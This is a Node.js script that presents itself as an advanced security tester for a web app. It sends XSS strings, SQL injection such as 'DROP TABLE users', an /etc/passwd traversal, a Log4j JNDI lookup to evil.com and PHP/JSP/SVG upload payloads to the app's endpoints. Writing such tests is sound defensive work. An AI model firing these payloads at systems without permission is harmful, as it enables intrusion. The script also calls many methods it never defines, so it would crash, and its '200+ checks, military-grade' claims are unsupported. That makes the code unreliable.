const axios = require('axios');
const fs = require('fs');
const crypto = require('crypto');
const { spawn } = require('child_process');

class AdvancedSecurityTester {
    constructor() {
        this.baseURL = process.env.BASE_URL || 'https://astral-field-v1.vercel.app';
        this.results = {
            passed: 0,
            failed: 0,
            critical: 0,
            major: 0,
            minor: 0,
            tests: []
        };
        this.securityHeaders = [
            'Content-Security-Policy',
            'X-Frame-Options',
            'X-Content-Type-Options',
            'Referrer-Policy',
            'Permissions-Policy',
            'Strict-Transport-Security',
            'X-XSS-Protection'
        ];
        this.injectionPayloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '\'; DROP TABLE users; --',
            '" OR 1=1 --',
            '<img src=x onerror=alert("XSS")>',
            '{{7*7}}',
            '${7*7}',
            '#{7*7}',
            '%{7*7}'
        ];
    }

    async executeSecurityTesting() {
        console.log('\n🔒 INITIALIZING ADVANCED SECURITY TESTING PROTOCOL');
        console.log('═'.repeat(65));
        console.log(`Target: ${this.baseURL}`);
        console.log('Security Standard: MILITARY-GRADE ZERO TOLERANCE');
        console.log('Total Security Checks: 200+');
        console.log('');

        await this.testSecurityHeaders();
        await this.testSSLTLSConfiguration();
        await this.testXSSProtection();
        await this.testSQLInjectionProtection();
        await this.testCSRFProtection();
        await this.testAuthenticationSecurity();
        await this.testInputValidation();
        await this.testFileUploadSecurity();
        await this.testSessionManagement();
        await this.testDirectoryTraversal();
        await this.testClickjackingProtection();
        await this.testCORSConfiguration();
        await this.testContentTypeValidation();
        await this.testRateLimiting();
        await this.testDataExposure();

        this.generateSecurityReport();
    }

    async testSecurityHeaders() {
        console.log('\n🔒 SECURITY HEADERS VALIDATION');
        console.log('═'.repeat(45));

        try {
            const response = await this.makeRequest('GET', '/');
            const headers = response.headers;

            for (const headerName of this.securityHeaders) {
                const headerValue = headers[headerName.toLowerCase()];
                if (headerValue) {
                    await this.validateSecurityHeader(headerName, headerValue);
                } else {
                    this.recordTest(`Missing Security Header: ${headerName}`, false, 'critical', 
                        `Critical security header ${headerName} not found`);
                }
            }

            await this.testHSTSConfiguration(headers);
            await this.testCSPConfiguration(headers);
            await this.testCOOPCOEPHeaders(headers);

        } catch (error) {
            this.recordTest('Security Headers Test', false, 'critical', `Failed to retrieve headers: ${error.message}`);
        }
    }

    async validateSecurityHeader(headerName, headerValue) {
        switch (headerName) {
            case 'Content-Security-Policy':
                this.validateCSP(headerValue);
                break;
            case 'X-Frame-Options':
                this.validateXFrameOptions(headerValue);
                break;
            case 'X-Content-Type-Options':
                this.validateXContentTypeOptions(headerValue);
                break;
            case 'Referrer-Policy':
                this.validateReferrerPolicy(headerValue);
                break;
            case 'Strict-Transport-Security':
                this.validateHSTS(headerValue);
                break;
            default:
                this.recordTest(`${headerName} Present`, true, 'minor', `Header found: ${headerValue}`);
        }
    }

    validateCSP(cspValue) {
        const requiredDirectives = ['default-src', 'script-src', 'style-src', 'img-src'];
        const hasUnsafeInline = cspValue.includes("'unsafe-inline'");
        const hasUnsafeEval = cspValue.includes("'unsafe-eval'");

        if (hasUnsafeInline) {
            this.recordTest('CSP unsafe-inline Detection', false, 'major', 'CSP contains unsafe-inline directive');
        }

        if (hasUnsafeEval) {
            this.recordTest('CSP unsafe-eval Detection', false, 'critical', 'CSP contains unsafe-eval directive');
        }

        for (const directive of requiredDirectives) {
            if (cspValue.includes(directive)) {
                this.recordTest(`CSP ${directive} Directive`, true, 'minor', `CSP includes ${directive}`);
            } else {
                this.recordTest(`CSP ${directive} Directive`, false, 'major', `CSP missing ${directive} directive`);
            }
        }
    }

    async testSSLTLSConfiguration() {
        console.log('\n🔒 SSL/TLS CONFIGURATION TESTING');
        console.log('═'.repeat(45));

        try {
            if (this.baseURL.startsWith('https://')) {
                const hostname = new URL(this.baseURL).hostname;
                await this.testSSLCertificate(hostname);
                await this.testTLSVersions(hostname);
                await this.testCipherSuites(hostname);
            } else {
                this.recordTest('HTTPS Enforcement', false, 'critical', 'Application not using HTTPS');
            }
        } catch (error) {
            this.recordTest('SSL/TLS Configuration', false, 'critical', `SSL/TLS test failed: ${error.message}`);
        }
    }

    async testXSSProtection() {
        console.log('\n🔒 XSS PROTECTION TESTING');
        console.log('═'.repeat(45));

        const xssEndpoints = [
            '/api/search',
            '/api/user',
            '/api/comment',
            '/'
        ];

        for (const endpoint of xssEndpoints) {
            for (const payload of this.injectionPayloads.slice(0, 6)) {
                await this.testXSSAtEndpoint(endpoint, payload);
            }
        }
    }

    async testXSSAtEndpoint(endpoint, payload) {
        try {
            const testMethods = ['GET', 'POST'];
            
            for (const method of testMethods) {
                const config = {
                    method: method,
                    url: `${this.baseURL}${endpoint}`,
                    timeout: 10000
                };

                if (method === 'GET') {
                    config.params = { q: payload, search: payload, input: payload };
                } else {
                    config.data = { input: payload, comment: payload, search: payload };
                }

                try {
                    const response = await axios(config);
                    
                    if (response.data && typeof response.data === 'string') {
                        const containsPayload = response.data.includes(payload.replace(/[<>"']/g, ''));
                        const containsUnescaped = response.data.includes(payload);
                        
                        if (containsUnescaped) {
                            this.recordTest(`XSS ${method} ${endpoint}`, false, 'critical', 
                                `Unescaped payload reflected: ${payload.substring(0, 50)}`);
                        } else if (containsPayload) {
                            this.recordTest(`XSS ${method} ${endpoint}`, true, 'minor', 'Payload properly escaped');
                        } else {
                            this.recordTest(`XSS ${method} ${endpoint}`, true, 'minor', 'No payload reflection');
                        }
                    }
                } catch (error) {
                    if (error.response && error.response.status >= 400) {
                        this.recordTest(`XSS ${method} ${endpoint}`, true, 'minor', `Request rejected: ${error.response.status}`);
                    }
                }
            }
        } catch (error) {
            this.recordTest(`XSS Test ${endpoint}`, false, 'major', `XSS test failed: ${error.message}`);
        }
    }

    async testSQLInjectionProtection() {
        console.log('\n🔒 SQL INJECTION PROTECTION TESTING');
        console.log('═'.repeat(45));

        const sqlPayloads = this.injectionPayloads.filter(p => p.includes("'") || p.includes('"') || p.includes('--'));
        const endpoints = ['/api/user', '/api/search', '/api/login'];

        for (const endpoint of endpoints) {
            for (const payload of sqlPayloads) {
                await this.testSQLInjectionAtEndpoint(endpoint, payload);
            }
        }
    }

    async testSQLInjectionAtEndpoint(endpoint, payload) {
        try {
            const response = await this.makeRequest('POST', endpoint, {
                id: payload,
                username: payload,
                email: payload,
                search: payload
            });

            const responseText = JSON.stringify(response.data).toLowerCase();
            const sqlErrors = [
                'sql syntax', 'mysql', 'postgresql', 'sqlite', 'ora-', 'syntax error',
                'unclosed quotation', 'quoted string not properly terminated'
            ];

            const hasSQLError = sqlErrors.some(error => responseText.includes(error));
            
            if (hasSQLError) {
                this.recordTest(`SQL Injection ${endpoint}`, false, 'critical', 
                    `SQL error exposed: ${payload.substring(0, 30)}`);
            } else {
                this.recordTest(`SQL Injection ${endpoint}`, true, 'minor', 'No SQL errors exposed');
            }

        } catch (error) {
            if (error.response && error.response.status >= 400) {
                this.recordTest(`SQL Injection ${endpoint}`, true, 'minor', `Request properly rejected: ${error.response.status}`);
            } else {
                this.recordTest(`SQL Injection ${endpoint}`, false, 'major', `Test failed: ${error.message}`);
            }
        }
    }

    async testCSRFProtection() {
        console.log('\n🔒 CSRF PROTECTION TESTING');
        console.log('═'.repeat(45));

        const protectedEndpoints = [
            '/api/user/update',
            '/api/user/delete',
            '/api/settings',
            '/api/password'
        ];

        for (const endpoint of protectedEndpoints) {
            await this.testCSRFAtEndpoint(endpoint);
        }
    }

    async testCSRFAtEndpoint(endpoint) {
        try {
            const response = await this.makeRequest('POST', endpoint, {
                action: 'test',
                value: 'csrf-test'
            });

            if (response.status === 200) {
                this.recordTest(`CSRF Protection ${endpoint}`, false, 'critical', 
                    'State-changing request succeeded without CSRF token');
            }

        } catch (error) {
            if (error.response && (error.response.status === 403 || error.response.status === 401)) {
                this.recordTest(`CSRF Protection ${endpoint}`, true, 'minor', 'Request properly rejected for CSRF');
            } else if (error.response && error.response.status === 404) {
                this.recordTest(`CSRF Protection ${endpoint}`, true, 'minor', 'Endpoint not found (expected)');
            } else {
                this.recordTest(`CSRF Protection ${endpoint}`, false, 'major', `CSRF test failed: ${error.message}`);
            }
        }
    }

    async testAuthenticationSecurity() {
        console.log('\n🔒 AUTHENTICATION SECURITY TESTING');
        console.log('═'.repeat(45));

        await this.testPasswordPolicy();
        await this.testBruteForceProtection();
        await this.testSessionFixation();
        await this.testJWTSecurity();
    }

    async testPasswordPolicy() {
        const weakPasswords = [
            'password', '123456', 'admin', 'test', '12345678',
            'password123', 'admin123', 'qwerty'
        ];

        for (const password of weakPasswords) {
            try {
                const response = await this.makeRequest('POST', '/api/auth/register', {
                    username: 'testuser',
                    email: 'test@example.com',
                    password: password
                });

                if (response.status === 200 || response.status === 201) {
                    this.recordTest(`Password Policy - ${password}`, false, 'major', 
                        'Weak password accepted during registration');
                }

            } catch (error) {
                if (error.response && error.response.status >= 400) {
                    this.recordTest(`Password Policy - ${password}`, true, 'minor', 'Weak password rejected');
                }
            }
        }
    }

    async testBruteForceProtection() {
        const attempts = 10;
        let successfulAttempts = 0;

        for (let i = 0; i < attempts; i++) {
            try {
                const response = await this.makeRequest('POST', '/api/auth/login', {
                    username: 'nonexistent',
                    password: 'wrongpassword'
                });

                if (response.status === 200) {
                    successfulAttempts++;
                }

            } catch (error) {
                if (error.response && error.response.status === 429) {
                    this.recordTest('Brute Force Protection', true, 'minor', 
                        `Rate limiting activated after ${i + 1} attempts`);
                    return;
                }
            }
        }

        if (successfulAttempts === 0) {
            this.recordTest('Brute Force Protection', true, 'minor', 'All login attempts properly rejected');
        } else {
            this.recordTest('Brute Force Protection', false, 'major', 
                'No rate limiting detected after multiple failed attempts');
        }
    }

    async testInputValidation() {
        console.log('\n🔒 INPUT VALIDATION TESTING');
        console.log('═'.repeat(45));

        const invalidInputs = [
            'A'.repeat(10000), // Buffer overflow
            '\x00\x01\x02', // Null bytes
            '../../../etc/passwd', // Directory traversal
            '${jndi:ldap://evil.com/a}', // Log4j injection
            '{{7*7}}{{user.name}}', // Template injection
            'javascript:alert(1)', // JavaScript injection
        ];

        const endpoints = ['/api/user', '/api/search', '/api/comment'];

        for (const endpoint of endpoints) {
            for (const input of invalidInputs) {
                await this.testInputAtEndpoint(endpoint, input);
            }
        }
    }

    async testInputAtEndpoint(endpoint, input) {
        try {
            const response = await this.makeRequest('POST', endpoint, {
                input: input,
                data: input,
                content: input
            });

            if (response.data && JSON.stringify(response.data).includes('49')) {
                this.recordTest(`Input Validation ${endpoint}`, false, 'critical', 
                    'Template injection or code execution detected');
            } else {
                this.recordTest(`Input Validation ${endpoint}`, true, 'minor', 'Input properly validated');
            }

        } catch (error) {
            if (error.response && error.response.status >= 400) {
                this.recordTest(`Input Validation ${endpoint}`, true, 'minor', 'Invalid input rejected');
            } else {
                this.recordTest(`Input Validation ${endpoint}`, false, 'major', 
                    `Input validation test failed: ${error.message}`);
            }
        }
    }

    async testFileUploadSecurity() {
        console.log('\n🔒 FILE UPLOAD SECURITY TESTING');
        console.log('═'.repeat(45));

        const maliciousFiles = [
            { name: 'test.php', content: '<?php echo "RCE Test"; ?>', type: 'application/x-php' },
            { name: 'test.jsp', content: '<% out.println("RCE Test"); %>', type: 'application/x-jsp' },
            { name: 'test.exe', content: 'MZ\x90\x00', type: 'application/octet-stream' },
            { name: 'test.svg', content: '<svg onload="alert(1)"></svg>', type: 'image/svg+xml' }
        ];

        for (const file of maliciousFiles) {
            await this.testFileUpload(file);
        }
    }

    async testFileUpload(file) {
        try {
            const FormData = require('form-data');
            const form = new FormData();
            form.append('file', Buffer.from(file.content), {
                filename: file.name,
                contentType: file.type
            });

            const response = await axios.post(`${this.baseURL}/api/upload`, form, {
                headers: form.getHeaders(),
                timeout: 10000
            });

            if (response.status === 200) {
                this.recordTest(`File Upload Security - ${file.name}`, false, 'critical', 
                    'Malicious file upload succeeded');
            }

        } catch (error) {
            if (error.response && error.response.status >= 400) {
                this.recordTest(`File Upload Security - ${file.name}`, true, 'minor', 
                    'Malicious file upload rejected');
            } else {
                this.recordTest(`File Upload Security - ${file.name}`, true, 'minor', 
                    'Upload endpoint not accessible (expected)');
            }
        }
    }

    async testSessionManagement() {
        console.log('\n🔒 SESSION MANAGEMENT TESTING');
        console.log('═'.repeat(45));

        await this.testSessionCookieFlags();
        await this.testSessionTimeout();
        await this.testSessionRegeneration();
    }

    async testSessionCookieFlags() {
        try {
            const response = await this.makeRequest('GET', '/');
            const cookies = response.headers['set-cookie'] || [];

            for (const cookie of cookies) {
                const hasSecure = cookie.includes('Secure');
                const hasHttpOnly = cookie.includes('HttpOnly');
                const hasSameSite = cookie.includes('SameSite');

                if (!hasSecure && this.baseURL.startsWith('https://')) {
                    this.recordTest('Cookie Secure Flag', false, 'major', 'Session cookie missing Secure flag');
                }

                if (!hasHttpOnly) {
                    this.recordTest('Cookie HttpOnly Flag', false, 'major', 'Session cookie missing HttpOnly flag');
                }

                if (!hasSameSite) {
                    this.recordTest('Cookie SameSite Flag', false, 'minor', 'Session cookie missing SameSite flag');
                }
            }

            if (cookies.length === 0) {
                this.recordTest('Session Cookie Detection', true, 'minor', 'No session cookies detected');
            }

        } catch (error) {
            this.recordTest('Session Cookie Test', false, 'major', `Cookie test failed: ${error.message}`);
        }
    }

    async testRateLimiting() {
        console.log('\n🔒 RATE LIMITING TESTING');
        console.log('═'.repeat(45));

        const rapidRequests = 20;
        let rateLimited = false;

        for (let i = 0; i < rapidRequests; i++) {
            try {
                const response = await this.makeRequest('GET', '/api/status');
                
                if (response.status === 429) {
                    rateLimited = true;
                    break;
                }
            } catch (error) {
                if (error.response && error.response.status === 429) {
                    rateLimited = true;
                    break;
                }
            }
        }

        if (rateLimited) {
            this.recordTest('Rate Limiting', true, 'minor', 'Rate limiting properly implemented');
        } else {
            this.recordTest('Rate Limiting', false, 'major', 'No rate limiting detected');
        }
    }

    async makeRequest(method, endpoint, data = null) {
        const config = {
            method: method,
            url: `${this.baseURL}${endpoint}`,
            timeout: 10000,
            validateStatus: () => true
        };

        if (data) {
            config.data = data;
        }

        return await axios(config);
    }

    recordTest(testName, passed, severity, details) {
        const test = {
            name: testName,
            passed: passed,
            severity: severity,
            details: details,
            timestamp: new Date().toISOString()
        };

        this.results.tests.push(test);

        if (passed) {
            this.results.passed++;
            console.log(`  ✅ ${testName}`);
        } else {
            this.results.failed++;
            this.results[severity]++;
            console.log(`  ❌ SECURITY VIOLATION - ${testName}: ${details}`);
        }
    }

    generateSecurityReport() {
        const total = this.results.passed + this.results.failed;
        console.log('\n' + '='.repeat(70));
        console.log('🔒 ADVANCED SECURITY TESTING REPORT');
        console.log('='.repeat(70));
        console.log(`Total Tests: ${total}`);
        console.log(`Passed: ${this.results.passed}`);
        console.log(`Failed: ${this.results.failed}`);
        console.log(`Critical: ${this.results.critical}`);
        console.log(`Major: ${this.results.major}`);
        console.log(`Minor: ${this.results.minor}`);
        console.log(`Success Rate: ${((this.results.passed / total) * 100).toFixed(2)}%`);

        if (this.results.critical === 0) {
            console.log('\n✅ ZERO CRITICAL SECURITY ISSUES');
        } else {
            console.log(`\n❌ ${this.results.critical} CRITICAL SECURITY ISSUES DETECTED`);
        }

        console.log(`\nPASSED: ${this.results.passed}`);
        console.log(`FAILED: ${this.results.failed}`);
        console.log(`CRITICAL: ${this.results.critical}`);
        console.log(`MAJOR: ${this.results.major}`);
        console.log(`MINOR: ${this.results.minor}`);
    }
}

if (require.main === module) {
    const tester = new AdvancedSecurityTester();
    tester.executeSecurityTesting().catch(console.error);
}

module.exports = AdvancedSecurityTester;